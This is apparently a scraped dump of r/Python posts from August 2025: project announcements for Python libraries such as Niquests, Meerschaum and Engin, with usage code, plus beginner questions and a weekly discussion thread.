* Feel free to link to tutorials or resources that might help.

# Example Submissions:

## Project Idea: Chatbot

**Difficulty**: Intermediate

**Tech Stack**: Python, NLP, Flask/FastAPI/Litestar 

**Description**: Create a chatbot that can answer FAQs for a website.

**Resources**: [Building a Chatbot with Python](https://www.youtube.com/watch?v=a37BL0stIuM)

# Project Idea: Weather Dashboard

**Difficulty**: Beginner

**Tech Stack**: HTML, CSS, JavaScript, API

**Description**: Build a dashboard that displays real-time weather information using a weather API.

**Resources**: [Weather API Tutorial](https://www.youtube.com/watch?v=9P5MY_2i7K8)

## Project Idea: File Organizer

**Difficulty**: Beginner

**Tech Stack**: Python, File I/O

**Description**: Create a script that organizes files in a directory into sub-folders based on file type.

**Resources**: [Automate the Boring Stuff: Organizing Files](https://automatetheboringstuff.com/2e/chapter9/)

Let's help each other grow. Happy coding! üåü"
1mt5hun,What is a Python thing you slept on too long?,pip_install_account,699,298,2025-08-17 23:04:55,https://www.reddit.com/r/Python/comments/1mt5hun/what_is_a_python_thing_you_slept_on_too_long/,"I only recently heard about alternative json libraries like orjson, ujson etc, or even msgspec. There are so many things most of us only learn about if we see it mentioned.

Curious what other tools, libraries, or features you wish you‚Äôd discovered earlier?



"
1mt2srw,D&D twitch bot!,ThatTurtleGM,0,8,2025-08-17 21:12:42,https://www.reddit.com/r/Python/comments/1mt2srw/dd_twitch_bot/,"I'm not quite ready to share it, since I can promise you its a complete mess of code and problems. But I've been working on a twitch bot that allows chatters to choose their own D&D classes, go on adventures, fight bosses, track exp, level up, spend channel points to use special abilities, and eventually ill fix the darn items so people can have those lol. I wanted to share this with you all, since I'm super new to coding and have had a ton of help with this already. I currently have most of the classes have one ability and a level of damage, defense, and skill they start with. I have a variety of bosses, effects, noises, bars, and visuals for chatters to see. And I even have level systems and boss choices based on max levels. Bosses can attack players back, and so much more.  If you want to check it out sometime hit me up! "
1msyh5h,why do people say python is slow but it still powers most of ai and data science,astarak98,0,19,2025-08-17 18:25:17,https://www.reddit.com/r/Python/comments/1msyh5h/why_do_people_say_python_is_slow_but_it_still/,"everyone keeps saying python is slow but at the same time its the backbone of ai, data science and even a lot of production systems. if speed was really such a big issue wouldn‚Äôt people have switched long ago to something faster like c++ or java? why do you think python still dominates despite the performance criticism

"
1msvufl,Envyte v1.0.0 | A library for using environment variables,Contemelia,0,12,2025-08-17 16:45:10,https://www.reddit.com/r/Python/comments/1msvufl/envyte_v100_a_library_for_using_environment/,"# What My Project Does?

* Auto-loads `.env` before your script runs without the need for extra code.
* Type-safe getters (`getInt()`, `getBool()`, `getString()`).
* `envyte run` [`script.py`](http://script.py) helps you run your script from CLI.
* The CLI works even with plain `os.getenv()` , which'd be perfect for legacy scripts.

# Installation

You can start by shooting up a terminal and installing it via:

`pip install envyte`

# Usage within your code

    import envyte
    
    a_number = envyte.getInt(""INT_KEY"", default = 0)
    a_string = envyte.getString(""STRING_KEY"", default = 'a')
    a_boolean = envyte.getBool(""BOOL_KEY"", default = False)
    a_value = envyte.get(""KEY"", default = '')

# Links

* GitHub: [https://github.com/Contemelia/Envyte](https://github.com/Contemelia/Envyte)
* PyPI: [https://pypi.org/project/envyte/](https://pypi.org/project/envyte/)

As I'm relatively new to creating Python libraries, I'm open to any constructive criticism ;)"
1msrd7j,Niquests 3.15 released ‚Äî We were in GitHub SOSS Fund!,Ousret,53,19,2025-08-17 13:46:57,https://www.reddit.com/r/Python/comments/1msrd7j/niquests_315_released_we_were_in_github_soss_fund/,"We're incredibly lucky [to be part of the Session 2](https://github.blog/open-source/maintainers/securing-the-supply-chain-at-scale-starting-with-71-important-open-source-projects/#developer-utilities-and-cli-helpers-%f0%9f%a7%91%f0%9f%92%bb) conducted by Microsoft via GitHub.
Initialy we were selected due to our most critical project out there, namely charset-normalizer. Distributed over 20 millions times a day
solely through PyPI, we needed some external expert auditors to help us build the future of safe OSS distribution.

And that's what we did. Not only that but we're in the phase of having every single project hosted to be [CRA compliant](https://github.blog/open-source/maintainers/what-the-eus-new-software-legislation-means-for-developers/?ut). Charset-Normalizer
already is! But we also fixed a lot of tiny security issues thanks to the sharp eyes of experts out there!

Now, there's another project we know is going to absolutely need the utmost standard of security. **Niquests!**

It's been seven months since our last update for the potential Requests replacement and we wanted to share some exciting news about it.

Here some anecdotes I'd like to share with all of you:

- _PyPI_

Niquests is about to break the 1000th place on PyPI most downloaded packages! With around 55 thousands pull each day.
A couple of months ago, we were around 1 to 5 thousands pull a day. This is very encouraging!

- _Corporate usage_

I receive a significant amount of feedback (either publicly in GH issue tracker or private email) from employees at diverse companies that
emphasis how much Niquests helped them.

- _Migration_

This one is the most surprising to me so far. I expected Requests user to be the 1st canal of incoming users migrating toward Niquests
but I was deadly wrong. In the first position is HTTPX, then Requests. That data is extracted from both our issue tracker and the general
statistic (access) to our documentation.

What I understand so far is that HTTPX failed to deliver when it comes to sensible (high pressure) production environment.

- _Personal story_

Earlier this year I was seeking a new job to start a new adventure, and I selected 15 job offers in France (Paris).
Out of those 15 interviews, during the interviews, 3 of them knew and were using Niquests in production the other did not knew about it. With one other who knew and did not get the time to migrate.
This was a bit unattended. This project is really gaining some traction, and this gave me some more hope that we're on the right track!

- _2 years anniversary!_

This month, Niquests reached in second years of existence and we're proud to be maintaining it so far.

- _Final notes_

Since the last time we spoke, we managed to remove two dependencies out of Niquests, implemented CRL (Certificate Revocation List) in addition to OCSP and fixed 12 bugs reported by the community.

We'd like to thanks the partners who helped make OSS safer and better through GitHub SOSS Fund.

### What My Project Does

Niquests is a HTTP Client. It aims to continue and expand the well established Requests library. For many years now, Requests has been frozen. Being left in a vegetative state and not evolving, this blocked millions of developers from using more advanced features.

### Target Audience

It is a production ready solution. So everyone is potentially concerned.

### Comparison

Niquests is the only HTTP client capable of serving HTTP/1.1, HTTP/2, and HTTP/3 automatically. The project went deep into the protocols (early responses, trailer headers, etc...) and all related networking essentials (like DNS-over-HTTPS, advanced performance metering, etc..)

Project official page: https://github.com/jawah/niquests "
1msq617,Am I Fried or Just Overthinking Python?,ConfidentOutside8349,0,22,2025-08-17 12:54:32,https://www.reddit.com/r/Python/comments/1msq617/am_i_fried_or_just_overthinking_python/,"I‚Äôm starting uni for engineering, but I haven‚Äôt chosen which type yet. I picked a coding class, and since I already took computer science in high school, I can‚Äôt take the beginner level. The problem is, I didn‚Äôt really learn much back then because my teacher wasn‚Äôt great, so I kind of lost interest.

Now I‚Äôve been practicing Python every day for the past week so far I‚Äôve covered strings, lists, sets, functions, dictionaries, etc. I found a ‚ÄúPython in 30 Days‚Äù site, and I‚Äôm working through it. Next, I‚Äôll get into things like file handling, web scraping, and virtual environments.

My question is: if I keep learning like this, will I be able to handle the advanced class? Or should I drop it? Is Python really that hard, or do people just make it sound scarier than it is?"
1msozcg,Orientaci√≥n al respecto con que se puede hacer con python,loZz891,0,0,2025-08-17 11:56:59,https://www.reddit.com/r/Python/comments/1msozcg/orientaci√≥n_al_respecto_con_que_se_puede_hacer/,"Necesito orientaci√≥n no s√© nada al respecto de programaci√≥n y talvez alguien me pueda ayudar.

Contexto: De alguna manera alguien tuvo acceso a mi correo en el cual ten√≠a verificaci√≥n con mi n√∫mero de tel√©fono.

Mi pregunta es la siguiente es posible que instalen una app malware y puedan espiar mi celular utilizando python o generar comandos en el sistema para que les env√≠e mi informaci√≥n. 

Tambi√©n tengo el problema de que Google no logra identificar mi dispositivo como de confianza para recuperar mi cuenta no se si es posible que tambi√©n bloqueen la verificaci√≥n ya que al ingresar el c√≥digo que Google me envia para recuperar mi cuenta me transfiere un link al correo que trato de recuperar.

Lo siento soy totalmente ignorante con el tema. "
1msoeam,CDC with Debezium on Real-Time theLook eCommerce Data,jaehyeon-kim,6,0,2025-08-17 11:25:26,https://www.reddit.com/r/Python/comments/1msoeam/cdc_with_debezium_on_realtime_thelook_ecommerce/,"We've built a Python-based project that transforms the classic [**theLook eCommerce**](https://console.cloud.google.com/marketplace/product/bigquery-public-data/thelook-ecommerce) dataset into a **real-time data stream**.

What it does:

* Continuously generates simulated user activity
* Writes data into PostgreSQL in real time
* Serves as a great source for CDC pipelines with Debezium + Kafka

Repo: https://github.com/factorhouse/examples/tree/main/projects/thelook-ecomm-cdc

If you're into data engineering + Python, this could be a neat sandbox to explore!"
1msmalu,Creating a web application using Python,Mountain_Clerk_6145,0,39,2025-08-17 09:18:09,https://www.reddit.com/r/Python/comments/1msmalu/creating_a_web_application_using_python/,"Hello Everyone, I need some help with the following ? I am creating a very basic python web application. I will be writing the application in Python , what I have some doubts as how will I run it in a website as MVP. I don't know Angular JS and Javascript.

1. What front end should I use
2. What backend should I use
3. How many components will it take to run the Python application on a website..

"
1msk71e,IT-Guru Assistant Chatbot,LeroyLim,0,2,2025-08-17 07:05:40,https://www.reddit.com/r/Python/comments/1msk71e/itguru_assistant_chatbot/,"Hey r/Python,

I created an open-source AI chatbot that searches through IT technical documentation for you. You can ask it questions in plain English, and it finds the relevant information, saving you from endless searching.

The main objective of this chatbot was to get junior engineers easy access to documentation and h o w to do something, just by asking the chatbot.

The point is that because LLMs database tends to be outdated quickly, or sometimes they hallucinate, so instead of using the LLMs trained data, which tends to be outdated in the case of cloud, etc AWS, Azure, GCP, we use the actual documentation.

The goal is to get you the answer you need, not just a link to a 100-page document.

 Here are some of the features:

* Natural Language Questions: Ask it things like ""H o w do I create an S3 bucket with Boto3?"" and it gets the right context or ""H o w do I create a virtual machine on Azure using the portal?""
* Multi-Source Searching: It's built to query multiple documentation sources at once. It currently pulls from AWS Documentation, Microsoft Learn, and Exa MCP servers, with a modular design to add more. It would provide your sources / web-links where it's quoting it from, or where the intent handler routed the query to.
* Interactive UI: The entire frontend is built with Streamlit for a quick POC, so it's easy to run locally and use in your browser.
* Open-Source: The project is fully open-source, and I'd love to get feedback or contributions.

Tech Stack:

* Backend & Core Logic: Python
* Web UI: Streamlit
* Doc Clients: AWS Documentation, Microsoft Learn, and Exa MCP Servers.
* LLM: OpenRouter API
* Architecture: It uses a simple intent router to direct questions to the correct documentation client. Possibly some feedback on how to handle the intent, Pull Requests etc are all welcome.

  
This has been a really fun project to build, and it's already saving me a lot of time for searching documentation. You can check out the code, clone the repo, and try it yourself here:

[https://github.com/leroylim/it-guru-assistant-chatbot](https://github.com/leroylim/it-guru-assistant-chatbot)

I'd love to hear what you think! What are the most painful documentations to search through? What sources should I prioritize adding next?"
1mshhu8,Who is building Python tools to support CAD techs or engineers in design?,Proof_Wrap_2150,18,18,2025-08-17 04:30:48,https://www.reddit.com/r/Python/comments/1mshhu8/who_is_building_python_tools_to_support_cad_techs/,"I‚Äôm thinking backend tools in Python to support CAD-heavy electrical/mechanical projects.
Things like:
- Generating AutoLISP or DXF files
- Parsing bill of materials
- Running logic from spec sheets or AI-generated design intent

Curious how others have built tooling like this, especially for drafters or engineers who don‚Äôt code. Any success stories or cautionary tales?"
1msgnpe,Meerschaum v3.0 released,Obliterative_hippo,25,2,2025-08-17 03:45:16,https://www.reddit.com/r/Python/comments/1msgnpe/meerschaum_v30_released/,"For the last five years, I‚Äôve been working on an open-source ETL framework in Python called [**Meerschaum**](https://github.com/bmeares/Meerschaum), and version 3.0 was just released. This release brings performance improvements, new features, and of course bugfixes across the board.

# What My Project Does

Meerschaum is an ETL framework, optimized for time-series and SQL workloads, that lets you build and organize your pipes, connectors, and scripts (actions). It's CLI-first and also includes a web console web application.

Meerschaum is extendable with plugins (Python modules), allowing you to add connectors, dash web pages, and actions in a tightly-knit environment.

# Target Audience

* Developers storing data in databases, looking for something less cumbersome than an ORM
* Data engineers building data pipelines and materializing views between databases
* Hobbyists experimenting with syncing data
* Sysadmins looking to consolidate miscellaneous scripts

# Usage

Install with `pip`:

    pip install meerschaum

Install the plugin `noaa`:

    mrsm install plugin noaa

Bootstrap a new pipe:

    mrsm bootstrap pipe -i sql:local

Sync pipes:

    mrsm sync pipes -i sql:local

Here's the same process as above but via the Python API:

```python
import meerschaum as mrsm

mrsm.entry('install plugin noaa')

pipe = mrsm.Pipe(
    'plugin:noaa', 'weather',
    columns={
        'id': 'station',
        'datetime': 'timestamp',
    },
    dtypes={
        'geometry': 'geometry[Point, 4326]',
    },
    parameters={
        'noaa': {
            'stations': ['KATL', 'KCLT', 'KGMU'],
        },
    },
)
 
success, msg = pipe.sync()

df = pipe.get_data(
    ['timestamp', 'temperature (degC)'],
    begin='2025-08-15',
    params={'station': 'KGMU'},
)
print(df)

#                     timestamp  temperature (degC)
# 0   2025-08-15 00:00:00+00:00                27.0
# 1   2025-08-15 00:05:00+00:00                28.0
# 2   2025-08-15 00:10:00+00:00                27.0
# 3   2025-08-15 00:15:00+00:00                27.0
# 4   2025-08-15 00:20:00+00:00                27.0
# ..                        ...                 ...
# 362 2025-08-16 22:00:00+00:00                32.0
# 363 2025-08-16 22:05:00+00:00                32.0
# 364 2025-08-16 22:10:00+00:00                31.0
# 365 2025-08-16 22:15:00+00:00                31.0
# 366 2025-08-16 22:20:00+00:00                31.0
# 
# [367 rows x 2 columns]

```

# Meerschaum Compose

A popular plugin for Meerschaum is [compose](https://github.com/bmeares/compose). Like Docker Compose, Meerschaum Compose lets you define your projects in a manifest YAML and run as a playbook, ideal for version-control and working in teams. For example, see the [Bike Walk Greenville repository](https://github.com/bmeares/bikewalkgreenville), where they organize their projects with Meerschaum Compose.

Here's an example `mrsm-compose.yaml` (copied from the [`techslamandeggs` repository](https://github.com/bmeares/techslamneggs). It downloads historical egg prices from FRED and does some basic transformations.

```yaml
project_name: ""eggs""

plugins_dir: ""./plugins""

sync:
  pipes:
    - connector: ""plugin:fred""
      metric: ""price""
      location: ""eggs""
      target: ""price_eggs""
      columns:
        datetime: ""DATE""
      dtypes:
        ""PRICE"": ""float64""
      parameters:
        fred:
          series_id: ""APU0000708111""

    - connector: ""plugin:fred""
      metric: ""price""
      location: ""chicken""
      target: ""price_chicken""
      columns:
        datetime: ""DATE""
      dtypes:
        ""PRICE"": ""float64""
      parameters:
        fred:
          series_id: ""APU0000706111""

    - connector: ""sql:etl""
      metric: ""price""
      location: ""eggs_chicken_a""
      target: ""Food Prices A""
      columns:
        datetime: ""DATE""
      parameters:
        query: |-
          SELECT
            e.""DATE"",
            e.""PRICE"" AS ""PRICE_EGGS"",
            c.""PRICE"" AS ""PRICE_CHICKEN""
          FROM ""price_eggs"" AS e
          INNER JOIN ""price_chicken"" AS c
            ON e.""DATE"" = c.""DATE""

    - connector: ""sql:etl""
      metric: ""price""
      location: ""eggs_chicken_b""
      target: ""Food Prices B""
      columns:
        datetime: ""DATE""
        food: ""FOOD""
      parameters:
        query: |-
          SELECT
            ""DATE"",
            ""PRICE"",
            'eggs' AS ""FOOD""
          FROM ""price_eggs""
          UNION ALL
          SELECT
            ""DATE"",
            ""PRICE"",
            'chicken' AS ""FOOD""
          FROM ""price_chicken""

config:
  meerschaum:
    instance: ""sql:etl""
    connectors:
      sql:
        etl:
          flavor: ""sqlite""
          database: ""/tmp/tiny.db""

environment: {}
```

And `plugins/fred.py`:

```python
#! /usr/bin/env python3
# -*- coding: utf-8 -*-
# vim:fenc=utf-8

""""""
Fetch economic data from FRED.
""""""

from typing import Any, Dict, Optional, List
import meerschaum as mrsm
from datetime import datetime

API_BASE_URL: str = 'https://fred.stlouisfed.org/graph/api/series/'
CSV_BASE_URL: str = 'https://fred.stlouisfed.org/graph/fredgraph.csv'

required = ['pandas']

def register(pipe: mrsm.Pipe) -> Dict[str, Any]:
    """"""
    Return the expected, default parameters.
    This is optional but recommended (helps with documentation).

    Parameters
    ----------
    pipe: mrsm.Pipe
        The pipe to be registered.

    Returns
    -------
    The default value of `pipe.parameters`.
    """"""
    return {
        'fred': {
            'series_id': None,
        },
        'columns': {
            'datetime': 'DATE',
        },
    }


def fetch(
    pipe: mrsm.Pipe,
    begin: Optional[datetime] = None,
    end: Optional[datetime] = None,
    **kwargs: Any
) -> 'pd.DataFrame':
    """"""
    Fetch the newest data from FRED.

    Parameters
    ----------
    pipe: mrsm.Pipe
        The pipe being synced.

    begin: Optional[datetime], default None
        If specified, fetch data from this point onward.
        Otherwise use `pipe.get_sync_time()`.

    end: Optional[datetime], default None
        If specified, fetch data older than this point.

    Returns
    -------
    A DataFrame to be synced.
    """"""
    import pandas as pd
    series_id = pipe.parameters.get('fred', {}).get('series_id', None)
    if not series_id:
        raise Exception(f""No series ID was set for {pipe}."")

    url = f""{CSV_BASE_URL}?id={series_id}""
    df = pd.read_csv(url)
    if series_id in df.columns:
        df['PRICE'] = pd.to_numeric(df[series_id], errors='coerce')
        del df[series_id]

    return df
```

# Links

* GitHub: [github.com/bmeares/Meerschaum](https://github.com/bmeares/Meerschaum)
* Release notes: [meerschaum.io/news/changelog/#30x-releases](https://meerschaum.io/news/changelog/#30x-releases)

Let me know what you think! I'm always looking for feedback and feature requests for future releases."
1msgblf,FxDC(FedxD Data Container),FeatGaming01,0,15,2025-08-17 03:27:22,https://www.reddit.com/r/Python/comments/1msgblf/fxdcfedxd_data_container/,"# üöÄ Introducing FxDC (FedxD Data Container)

Hey everyone, I‚Äôve been working on a project called **FxDC (FedxD Data Container)** and I‚Äôd love to share it with you all.  

---

## üîπ What My Project Does
The main motive of FxDC is to **store a Python object in a human-readable format** that can be **automatically converted back into its original class object**.  

This means you can:
- ‚úÖ Serialize objects into a clean, readable format  
- ‚úÖ Reload them back into the **same class** with zero boilerplate  
- ‚úÖ Instantly access class methods and attributes again  
- ‚úÖ Use customizable configs with built-in type checking and validation  
- ‚úÖ Get precise error feedback (`FieldError`, `TypeCheckFailure`, etc.)  

---

## üéØ Target Audience
- Developers who want to **store Python objects** in a **human-friendly format**  
- Anyone who needs to **restore objects back to their original class** for easier use of methods and attributes  
- Python projects that require **structured configs bound to real classes**  
- People who find JSON/YAML too limited when dealing with **class-based data models**  

---

## ‚öñÔ∏è Comparison with JSON / YAML
- **JSON** ‚Üí Machine-friendly, but doesn‚Äôt restore into classes or enforce types.  
- **YAML** ‚Üí Human-friendly, but ambiguous and lacks validation.  
- **FxDC** ‚Üí Human-readable, strict, and designed to map directly to **Python classes**, making configs usable like real objects.  

Example:

```yaml
# YAML
user:
  name: ""John""
  age: 25
```

```fxdc
# FxDC
user|User
    name|str = ""John""
    age|int = 25
```

With FxDC, this file can be directly loaded back into a Python `User` object, letting you immediately call:  
```python
user.greet()
user.is_adult()
```

---

## üì¶ Installation
You can install FxDC from **PyPI** directly:

**Stable (v4):**
```bash
pip install fxdc==4.1
```

**Latest Beta (v5b2):**
```bash
pip install fxdc==5b2
```

---

## üîó Links
- üìÇ GitHub (Stable): [https://github.com/KazimFedxD/FedxD-Data-Container](https://github.com/KazimFedxD/FedxD-Data-Container)  
- üß™ GitHub (Beta / Dev branch): [https://github.com/KazimFedxD/FedxD-Data-Container/tree/dev](https://github.com/KazimFedxD/FedxD-Data-Container/tree/dev)  
- üì¶ PyPI: [https://pypi.org/project/fxdc/](https://pypi.org/project/fxdc/)  

---

## üí¨ Feedback & Beta Testing
üì¢ **Beta Testing Note:** If you try out the beta (`v5b2`) and provide feedback, your name will be credited in the official documentation under **Beta Testers**.  

You can share feedback through:  
- üíå Email  
- üêô GitHub Issues  
- üí¨ Reddit DMs  
- üéÆ Discord: **kazimabbas**  
"
1msgb8u,cMCP v0.3.0 released (A command-line utility for interacting with MCP servers),RussellLuo,1,0,2025-08-17 03:26:52,https://www.reddit.com/r/Python/comments/1msgb8u/cmcp_v030_released_a_commandline_utility_for/,"Hi everyone, [cMCP v0.3.0](https://github.com/RussellLuo/cmcp/releases/tag/v0.3.0) has been released!

What's new:

- Support JSON parameters containing newlines
- Add metadata support for STDIO and SSE
- Add support for Streamable HTTP transport

Free free to check it out or install it [here](https://github.com/RussellLuo/cmcp)."
1msc4g4,Sunday Daily Thread: What's everyone working on this week?,AutoModerator,6,10,2025-08-17 00:00:31,https://www.reddit.com/r/Python/comments/1msc4g4/sunday_daily_thread_whats_everyone_working_on/,"# Weekly Thread: What's Everyone Working On This Week? üõ†Ô∏è

Hello /r/Python! It's time to share what you've been working on! Whether it's a work-in-progress, a completed masterpiece, or just a rough idea, let us know what you're up to!

## How it Works:

1. **Show & Tell**: Share your current projects, completed works, or future ideas.
2. **Discuss**: Get feedback, find collaborators, or just chat about your project.
3. **Inspire**: Your project might inspire someone else, just as you might get inspired here.

## Guidelines:

* Feel free to include as many details as you'd like. Code snippets, screenshots, and links are all welcome.
* Whether it's your job, your hobby, or your passion project, all Python-related work is welcome here.

## Example Shares:

1. **Machine Learning Model**: Working on a ML model to predict stock prices. Just cracked a 90% accuracy rate!
2. **Web Scraping**: Built a script to scrape and analyze news articles. It's helped me understand media bias better.
3. **Automation**: Automated my home lighting with Python and Raspberry Pi. My life has never been easier!

Let's build and grow together! Share your journey and learn from others. Happy coding! üåü"
1msa8tn,Automating GitHub PR merges with Python (for Pull Shark badge ü¶à),Few_Blacksmith7433,0,0,2025-08-16 22:42:42,https://www.reddit.com/r/Python/comments/1msa8tn/automating_github_pr_merges_with_python_for_pull/,"**What My Project Does**  
This project is a Python script that automates the creation and merging of Pull Requests on GitHub.  
It creates a temporary branch, opens a PR, merges it, and updates a [`status.md`](http://status.md) file with the current PR count and a corresponding badge (default / bronze / silver / gold).  
The main goal is to learn the GitHub API and‚Ä¶ of course‚Ä¶ unlock the Pull Shark badge ü¶à.

**Target Audience**  
This script is intended **for educational purposes only**.  
It‚Äôs not designed for production or real collaboration workflows, but for developers who want to:

* Explore GitHub API automation using Python
* Learn how to work with [PyGithub](https://pypi.org/project/PyGithub/)
* Experiment with automated PR workflows safely on personal/test repositories

**Comparison**  
There are existing CI/CD tools and bots (like GitHub Actions or Dependabot) that can open or merge PRs.  
However, this project is much simpler:

* No CI/CD pipelines
* Lightweight, just Python + PyGithub
* Focused specifically on Pull Shark badge ‚Äúgrinding‚Äù and educational experimentation

üëâ Repo link: [Pull-Shark-Script](https://github.com/callmenoway/Pull-Shark-Script)

If you find it interesting, a ‚≠ê on the repo or a follow would mean a lot üôå"
1ms6u7y,Best way to share SQL/Python query results with external users?,Expert-Ad-3947,11,9,2025-08-16 20:31:38,https://www.reddit.com/r/Python/comments/1ms6u7y/best_way_to_share_sqlpython_query_results_with/,"
I currently use SQL + Python to query  Oracle/Impala databases, then push results into Google Sheets, which is connected to Looker Studio for dashboards. This works, but it feels clunky and limited when I want external users to filter data themselves (e.g., by Client ID).

I‚Äôm exploring alternatives that would let me publish tables and charts in a more direct way, while still letting users run parameterized queries safely. Should I move toward something like Streamlit or Fast API + Javascript ? Curious what others have found effective."
1ms54hv,I built a lightweight functional programming toolkit for Python.,Being-Formal,63,14,2025-08-16 19:27:50,https://www.reddit.com/r/Python/comments/1ms54hv/i_built_a_lightweight_functional_programming/,"
### What My Project Does
I built **darkcore**, a lightweight functional programming toolkit for Python.  
It provides Functor / Applicative / Monad abstractions and implements classic monads (`Maybe`, `Result`, `Either`, `Reader`, `Writer`, `State`).  
It also includes transformers (`MaybeT`, `StateT`, `WriterT`, `ReaderT`) and an operator DSL (`|`, `>>`, `@`) that makes Python feel closer to Haskell.  

The library is both a **learning tool** (experiment with monad laws in Python) and a **practical utility** (safer error handling, fewer `if None` checks).

### Target Audience
- Python developers who enjoy functional programming concepts  
- Learners who want to try Haskell-style abstractions in Python  
- Teams that want safer error handling (`Result`, `Maybe`) or cleaner pipelines in production code  

### Comparison
Other FP-in-Python libraries are often incomplete or unmaintained.  
- **darkcore** focuses on providing *monad transformers*, rarely found in Python libraries.  
- It adds a concise operator DSL (`|`, `>>`, `@`) for chaining computations.  
- Built with **mypy strict typing** and **pytest coverage**, so it‚Äôs practical beyond just experimentation.  

### ‚ú® Features
- Functor / Applicative / Monad base abstractions  
- Core monads: Maybe, Result, Either, Reader, Writer, State  
- Transformers: MaybeT, StateT, WriterT, ReaderT  
- Operator DSL:  
  - `|` = fmap (map)  
  - `>>` = bind (flatMap)  
  - `@` = ap (applicative apply)  
- mypy strict typing, pytest coverage included  

### Example (Maybe)
```python
from darkcore.maybe import Maybe

res = Maybe(3) | (lambda x: x+1) >> (lambda y: Maybe(y*2))
print(res)  # Just(8)
```
üîó GitHub: https://github.com/minamorl/darkcore
üì¶ PyPI: https://pypi.org/project/darkcore/

Would love feedback, ideas, and discussion on use cases!"
1ms4m9e,PySurf v1.3.0 release - A new lightweight open-source Python browser,Apart-Television4396,0,8,2025-08-16 19:09:36,https://www.reddit.com/r/Python/comments/1ms4m9e/pysurf_v130_release_a_new_lightweight_opensource/,"I'm excited to announce the latest release of my open-source browser, PySurf. For those of you who are new, PySurf is a lightweight web browser built entirely in Python.

Here's what's new in v1.3.0:

* **Robust Download Manager:** A new, dedicated dialog to track the progress of downloads, with the ability to pause, resume, and cancel them.
* **Persistent History:** A new history dialog that saves your browsing history across sessions, with the option to delete individual items.
* **UI/UX Improvements:** We've introduced a new sidebar! Please rate the experience using the sidebar.
* **Updated Codebase:** All settings (bookmarks, history, downloads, and shortcuts) are now persistent and stored in JSON files.
* The changelog is [here](https://github.com/VG-dev1/PySurf/releases/tag/v1.3.0).

Follow the instructions for downloading [here](https://github.com/VG-dev1/PySurf/wiki/Installation-guide).

Thank you to everyone in this community for your support and feedback. I can't wait to see what you all build!

Check it out [here](https://github.com/VG-dev1/PySurf)."
1ms0dav,A tool to train Rubik's cube blindfolded,RRTheGuy,3,0,2025-08-16 16:37:17,https://www.reddit.com/r/Python/comments/1ms0dav/a_tool_to_train_rubiks_cube_blindfolded/,"# What my project does

My project help you to practice and train Rubik's cube blindfolded with the Pochmann method.

It tells you when you make a mistake so you are more aware of that, and can learn from them.

It also stores all the solves data in a .csv file, including letters and when you made a mistake

# Target Audience

For those who wants to practice or get better in Rubik's cube blindfolded.

For those like me who are frustrated when making mistakes and not knowing where they did that and how to fix that.

For those who wants a real breakdown of each solve, and leave a trace of their rubik's cube blindfolded session.

I made this project for myself, and I hope it will help others.

# Comparison

To be honest, I didn't really compare to others tools because I think comparison can kill confidence or joy and that we should mind our own business with our ideas.

I don't even know if there's already existing tools to train blindfolded, but probably there is.

And I'm pretty sure my project is unique because I did it myself, with my own inspiration and my own experience.

So if anyone know or find a tool that looks like mine or with the same purpose, feel free to share, it would be a big coincidence.

# Conclusion

Here's the project source code: [https://github.com/RadoTheProgrammer/rubik-bld](https://github.com/RadoTheProgrammer/rubik-bld)

I did the best that I could so I hope it worth it. Feel free to share what you think about it."
1mrzjpe,Introducing Engin - a modular application framework inspired by Uber's fx package for Go,lanster100,18,3,2025-08-16 16:07:34,https://www.reddit.com/r/Python/comments/1mrzjpe/introducing_engin_a_modular_application_framework/,"**TL;DR:** Think of your typical dependency injection framework but it also runs your application, manages any lifecycle concerns and supervises background tasks + it comes with its own CLI commands for improved devex.

Documentation: [https://engin.readthedocs.io/](https://engin.readthedocs.io/)

Source Code: [https://github.com/invokermain/engin](https://github.com/invokermain/engin)

**What My Project Does**

Engin is a lightweight modular application framework powered by dependency injection. I have been working on it for almost a year now and it has been *successfully* running in production for over 6 months.

The Engin framework gives you:

* A fully-featured dependency injection system.
* A robust application runtime with lifecycle hooks and supervised background tasks.
* Zero boiler-plate code reuse across applications.
* Integrations for other frameworks such as FastAPI.
* Full async support.
* CLI commands to aid local development.

**Target Audience**

Professional Python developers working on larger projects or maintaining many Python services. Or anyone that's a fan of existing DI frameworks, e.g. [dependency-injector](https://python-dependency-injector.ets-labs.org/) or [injector](https://injector.readthedocs.io/en/latest/).

**Comparison**

In terms of Dependency Injection it is on par with the capabilities of other frameworks, although it does offer full async support which some frameworks, e.g. injector, do not. I am not aware of any other frameworks which extends this into a fully featured application framework.

Engin is very heavily inspired by the fx framework for Go & takes inspiration around ergonomics from the injector framework for Python.

**Example**

A small example which shows some of the features of Engin. This application makes 3 http requests and shuts itself down.

    import asyncio
    from httpx import AsyncClient
    from engin import Engin, Invoke, Lifecycle, OnException, Provide, Supervisor
    
    
    def httpx_client_factory(lifecycle: Lifecycle) -> AsyncClient:
        # create our http client
        client = AsyncClient()
        # this will open and close the AsyncClient as part of the application's lifecycle
        lifecycle.append(client)
        return client
    
    
    async def main(
        httpx_client: AsyncClient,
        supervisor: Supervisor,
    ) -> None:
        async def http_requests_task():
            # simulate a background task
            for x in range(3):
                await httpx_client.get(""https://httpbin.org/get"")
                await asyncio.sleep(1.0)
            # raise an error to shutdown the application, normally you wouldn't do this!
            raise RuntimeError(""Forcing shutdown"")
    
        # supervise the http requests as part of the application's lifecycle
        supervisor.supervise(http_requests_task, on_exception=OnException.SHUTDOWN)
    
    
    # define our modular application
    engin = Engin(Provide(httpx_client_factory), Invoke(main))
    
    # run it!
    asyncio.run(engin.run())

The logs when run will output:

    INFO:engin:starting engin
    INFO:engin:startup complete
    INFO:httpx:HTTP Request: GET https://httpbin.org/get ""HTTP/1.1 200 OK""
    INFO:httpx:HTTP Request: GET https://httpbin.org/get ""HTTP/1.1 200 OK""
    INFO:httpx:HTTP Request: GET https://httpbin.org/get ""HTTP/1.1 200 OK""
    ERROR:engin:supervisor task 'http_requests_task' raised RuntimeError, starting shutdown
    INFO:engin:stopping engin
    INFO:engin:shutdown complete"
1mryi32,"Python + AutoCAD: Who‚Äôs doing it, and how far can you go?",Proof_Wrap_2150,16,13,2025-08-16 15:30:11,https://www.reddit.com/r/Python/comments/1mryi32/python_autocad_whos_doing_it_and_how_far_can_you/,I‚Äôm exploring the intersection of Python and AutoCAD for electrical and mechanical engineers who are using CAD tools for detailed design work. I‚Äôd like to understand how python can augment their workflow and help do things like quality checks. 
